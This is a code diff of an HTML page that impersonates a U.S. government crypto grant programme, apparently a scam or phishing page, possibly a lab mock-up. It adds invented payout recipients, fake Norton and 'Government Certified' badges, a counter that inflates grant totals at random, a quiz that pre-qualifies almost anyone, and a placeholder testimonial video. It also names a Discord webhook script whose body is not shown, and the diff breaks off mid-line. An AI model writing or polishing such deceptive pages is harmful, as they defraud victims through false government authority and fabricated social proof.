@@ -62,7 +62,7 @@
             margin-bottom: 5px;
             font-weight: bold;
         }
-        input {
+        input, select {
             width: 100%;
             padding: 8px;
             box-sizing: border-box;
@@ -81,11 +81,7 @@
         button:hover {
             background-color: #004d75;
         }
-        button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-        #statusMessage {
+        #statusMessage, #quizResult {
             margin-top: 10px;
             padding: 10px;
             border: 1px solid #ddd;
@@ -103,18 +99,57 @@
             color: white;
             border-radius: 5px;
         }
-        .payment-methods {
+        .recent-payouts {
             margin-top: 10px;
             padding: 10px;
             background-color: rgba(255, 255, 255, 0.2);
             border-radius: 5px;
         }
-        .payment-method {
+        .payout-item {
             margin-bottom: 10px;
             padding: 8px;
             background-color: white;
             color: #333;
             border-radius: 3px;
+            font-style: italic;
+        }
+        .news-ticker {
+            background-color: #005d8f;
+            color: white;
+            padding: 5px;
+            text-align: center;
+            font-size: 14px;
+            margin: 10px 0;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        .ticker-content {
+            display: inline-block;
+            animation: ticker 15s linear infinite;
+        }
+        @keyframes ticker {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+        .security-badges img {
+            width: 80px;
+            margin: 10px;
+            opacity: 0.8;
+        }
+        .quiz-section {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 5px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
+        }
+        .live-stats {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #0073aa;
+            color: white;
+            border-radius: 5px;
+            text-align: center;
         }
         .testimonials {
             margin-top: 20px;
@@ -135,6 +170,17 @@
             height: 80px;
             border-radius: 50%;
             margin-bottom: 10px;
+        }
+        .video-testimonial iframe {
+            width: 100%;
+            height: 200px;
+            border: none;
+            border-radius: 5px;
+        }
+        .partner-logos img {
+            width: 100px;
+            margin: 10px;
+            opacity: 0.7;
         }
         footer {
             clear: both;
@@ -177,32 +223,55 @@
             </form>
             <div id="statusMessage"></div>
             <div class="payout-section">
-                <h3>Live Payout Processing</h3>
-                <p><strong>Reference ID:</strong> <span id="displayRefId"></span></p>
-                <p><strong>Status:</strong> <span id="statusDisplay">Pending</span></p>
-                <p>Once approved, receive your grant instantly via secure channels. Payouts processed in real-time for 2025 compliance.</p>
-                <div class="payment-methods">
-                    <div class="payment-method">
-                        <strong>Bitcoin (BTC) Wallet:</strong><br>
-                        bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh – Receiving live payouts for approved grants.
-                    </div>
-                    <div class="payment-method">
-                        <strong>Cash App Tag:</strong><br>
-                        $GovGrant2025 – Instant transfers for verified applicants.
-                    </div>
-                    <div class="payment-method">
-                        <strong>PayPal Email:</strong><br>
-                        grants@usacrypto.gov – Secure electronic payouts available 24/7.
-                    </div>
-                    <div class="payment-method">
-                        <strong>Venmo Username:</strong><br>
-                        @USAGrantReserve – Quick mobile payouts for mobile users.
-                    </div>
-                    <div class="payment-method">
-                        <strong>Zelle Phone:</strong><br>
-                        +1 (202) 555-0199 – Bank-linked transfers for immediate funding.
-                    </div>
+                <h3>Recent Payouts</h3>
+                <p>Once approved, your grant will be processed discreetly and securely. See below for examples of recent recipient payouts.</p>
+                <div class="recent-payouts">
+                    <div class="payout-item">Rudy Henderson received $5,000 through PayPal Bitcoin.</div>
+                    <div class="payout-item">James Prowler received $2,500 with Moon Pay.</div>
+                    <div class="payout-item">Stella Stanford received $10,000 via Cash App.</div>
+                    <div class="payout-item">Marcus Lee received $4,000 through Venmo transfer.</div>
+                    <div class="payout-item">Elena Ramirez received $7,500 using Zelle.</div>
+                    <div class="payout-item">Tyler Brooks received $3,000 via Bitcoin wallet.</div>
+                    <div class="payout-item">Sophia Chen received $6,000 through PayPal.</div>
+                    <div class="payout-item">Derek Walsh received $8,000 with Cash App Bitcoin.</div>
                 </div>
+            </div>
+            <div class="news-ticker">
+                <div class="ticker-content">
+                    &nbsp; 2025 Grants Issued to 10,000+ Americans – Apply Now! &nbsp; | &nbsp; Total Funding Exceeds $50M! &nbsp; | &nbsp; New Crypto Reserve Launched Today! &nbsp;
+                </div>
+            </div>
+            <div class="security-badges">
+                <img src="https://via.placeholder.com/80?text=SSL+Secured" alt="SSL Secured">
+                <img src="https://via.placeholder.com/80?text=Verified+by+Norton" alt="Verified by Norton">
+                <img src="https://via.placeholder.com/80?text=Government+Certified" alt="Government Certified">
+            </div>
+            <div class="quiz-section">
+                <h3>Eligibility Quiz</h3>
+                <form id="eligibilityQuiz" onsubmit="checkEligibility(event)">
+                    <div class="form-group">
+                        <label>Are you a U.S. citizen?</label>
+                        <select name="citizen" required>
+                            <option value="">Select</option>
+                            <option value="yes">Yes</option>
+                            <option value="no">No</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Are you over 18?</label>
+                        <select name="age" required>
+                            <option value="">Select</option>
+                            <option value="yes">Yes</option>
+                            <option value="no">No</option>
+                        </select>
+                    </div>
+                    <button type="submit">Check Eligibility</button>
+                </form>
+                <div id="quizResult"></div>
+            </div>
+            <div class="live-stats">
+                <p>Grants Issued: <span id="grantsIssued">5,432</span></p>
+                <p>Total Funded: $<span id="totalFunded">12,000,000</span></p>
             </div>
         </div>
     </div>
@@ -221,6 +290,17 @@
             <p><strong>Lisa T., Small Business Owner</strong><br>"Cash App transfer arrived instantly. Government Crypto Grant made my dreams reality!"</p>
         </div>
     </div>
+    <div class="video-testimonial" style="max-width: 1200px; margin: 20px auto; padding: 20px; background-color: rgba(255, 255, 255, 0.9); border-radius: 5px; box-shadow: 0 0 5px rgba(0,0,0,0.1);">
+        <h3 style="text-align: center;">Video Testimonial</h3>
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0" title="Placeholder Testimonial Video" frameborder="0" allowfullscreen></iframe>
+        <p style="text-align: center; font-style: italic;">Watch John D. share his $15,000 grant success story!</p>
+    </div>
+    <div class="partner-logos" style="max-width: 1200px; margin: 20px auto; text-align: center; padding: 20px; background-color: rgba(255, 255, 255, 0.9); border-radius: 5px; box-shadow: 0 0 5px rgba(0,0,0,0.1);">
+        <h3>Trusted Partners</h3>
+        <img src="https://via.placeholder.com/100?text=Bank+USA" alt="Bank USA">
+        <img src="https://via.placeholder.com/100?text=Crypto+Exchange" alt="Crypto Exchange">
+        <img src="https://via.placeholder.com/100?text=Secure+Pay" alt="Secure Pay">
+    </div>
     <footer>
         <p>&copy; 2025 U.S. Government Crypto Grant and Reserve. All rights reserved. Secure and Official.</p>
     </footer>
@@ -238,7 +318,7 @@
         })(document);
     </script>
 
-    <!-- Discord Webhook Script -->
+    <!-- Discord Webhook and Additional Scripts -->
     <script>
         function generateReferenceCode(event) {
             event.preventDefault();
@@ -272,13 +352,35 @@
             });
         }
 
+        function checkEligibility(event) {
+            event.preventDefault();
+            const citizen = document.querySelector('select[name="citizen"]').value;
+            const age = document.querySelector('select[name="age"]').value;
+            const quizResult = document.getElementById('quizResult');
+
+            if (citizen === 'yes' && age === 'yes') {
+                quizResult.style.display = 'block';
+                quizResult.style.color = 'green';
+                quizResult.textContent = 'Congratulations! You are pre-qualified. Proceed to generate your reference code.';
+            } else {
+                quizResult.style.display = 'block';
+                quizResult.style.color = 'red';
+                quizResult.textContent = 'Sorry, you do not meet the eligibility criteria at this time.';
+            }
+        }
+
+        // Live Stats Counter
+        let grantsIssued = 5432;
+        let totalFunded = 12000000;
+        setInterval(() => {
+            grantsIssued += Math.floor(Math.random() * 5);
+            totalFunded += Math.floor(Math.random() * 10000);
+            document.getElementById('grantsIssued').textContent = grantsIssued;
+            document.getElementById('totalFunded').textContent = totalFunded.toLocaleString();
+        }, 2000);
+
         // Manual status update via live chat (simulated for lab)
         function updateStatus(refId, status) {
             if (document.getElementById('displayRefId').textContent === refId) {
                 document.getElementById('statusDisplay').textContent = status;
-                document.getElementById('statusMessage').textContent = `Status updated to ${status}. Payout ready via selected method.`;
-            }
-        }
-    </script>
-</body>
-</html>
+                document.getElementById('statusMessage').textContent = `Status updated to ${status}. Payout ready via selected method
